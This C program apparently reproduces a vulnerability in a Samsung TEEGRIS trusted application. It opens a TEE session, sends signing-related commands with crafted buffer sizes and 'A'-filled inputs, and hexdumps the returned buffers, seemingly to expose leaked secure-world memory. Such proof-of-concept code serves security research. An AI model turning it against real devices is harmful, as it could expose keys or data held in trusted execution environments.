#include <stdio.h>
#include <stdio.h>
#include <ctype.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
        system("ipcrm -M 0x13337");
        system("ipcrm -M 0x13338");
        system("ipcrm -M 0x13339");
        system("ipcrm -M 0x1333a");
#endif
}

void hexdump(const void *data, size_t size) {
    const uint8_t *p = (const uint8_t*)data;
    size_t offset = 0;

    while (offset < size) {
        // Print offset
        printf("%08zx  ", offset);

        // Print hex bytes (16 per line)
        for (size_t i = 0; i < 16; i++) {
            if (offset + i < size) {
                printf("%02x ", p[offset + i]);
            } else {
                printf("   ");
            }
            if (i == 7) printf(" "); // extra space in the middle
        }

        // Print ASCII representation
        printf(" |");
        for (size_t i = 0; i < 16 && offset + i < size; i++) {
            unsigned char c = p[offset + i];
            printf("%c", isprint(c) ? c : '.');
        }
        printf("|\n");

        offset += 16;
    }
}

void* mem_area1;
void* mem_area2;
void* mem_area3;

#define UID 4

TEEC_Result generate_ask(TEEC_Context *context, TEEC_Session *session)
{
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
    
	printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].value.a = UID;
    op.params[0].value.b = UID;

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1004, &op, &err_origin);
	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
    return res;
}

TEEC_Result init_sign(TEEC_Context *context, TEEC_Session *session, long* session_id)
{
        uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT);
   
    memset(mem_area3, 'A', 0x100); 
	printf("params: 0x%lx\n", op.paramTypes);
    op.params[3].tmpref.buffer = mem_area1;  
    op.params[3].tmpref.size =  0x370; 
    op.params[1].tmpref.buffer = mem_area2;  //name
    op.params[1].tmpref.size =  0x10; 
    op.params[2].tmpref.buffer = mem_area3; 
    op.params[2].tmpref.size =  0x100; 
    op.params[0].value.a = UID;
    op.params[0].value.b = UID;

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x100c, &op, &err_origin);
	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
    printf("session id: 0x%llx\n", *(long*)mem_area1);
    *session_id =  *(long*)mem_area1;
    return res;
}

TEEC_Result finish_sign(TEEC_Context *context, TEEC_Session *session, long session_id)
{
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_OUTPUT,TEEC_MEMREF_TEMP_OUTPUT, TEEC_VALUE_INPUT);
    
	printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].tmpref.buffer = mem_area1;  
    op.params[0].tmpref.size =  0x400; 
    op.params[1].tmpref.buffer = mem_area2; 
    op.params[1].tmpref.size =  0x300; 
    op.params[2].tmpref.buffer = mem_area3; 
    op.params[2].tmpref.size =  0x300; 
    op.params[3].value.a = 3;
    memcpy(op.params[0].tmpref.buffer, &session_id, 8); 

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x100d, &op, &err_origin);
	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
    printf("mem_area2 %s\n", mem_area2);
    hexdump(mem_area2, 0x300);
    printf("mem_area3 %s\n", mem_area3); 
    hexdump(mem_area3, 0x300);
    return res;
}


int main(int argc, char **argv)
{
    char* ta = "377ee4e8-af0e-474f-a9d636a9268fe85c";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

	cleanup_shm();
    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    mem_area1 = allocate_param_mem(&context, 0x1000);
    mem_area2 = allocate_param_mem(&context, 0x1000);
    mem_area3 = allocate_param_mem(&context, 0x3000);
    long session_id;
     
    printf("[+] sending query...\n");
    res = generate_ask(&context, &session); 
    if(res != TEEC_SUCCESS){
        printf("generate_ask failed: 0x%x\n", res);
        return -1;
    }
    res = init_sign(&context, &session, &session_id);
    if(res != TEEC_SUCCESS){
        printf("init_sign failed: 0x%x\n", res);
        return -1;
    }
    res = finish_sign(&context, &session, session_id);
    if(res != TEEC_SUCCESS){
        printf("finish_sign failed: 0x%x\n", res);
        return -1;
    }
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
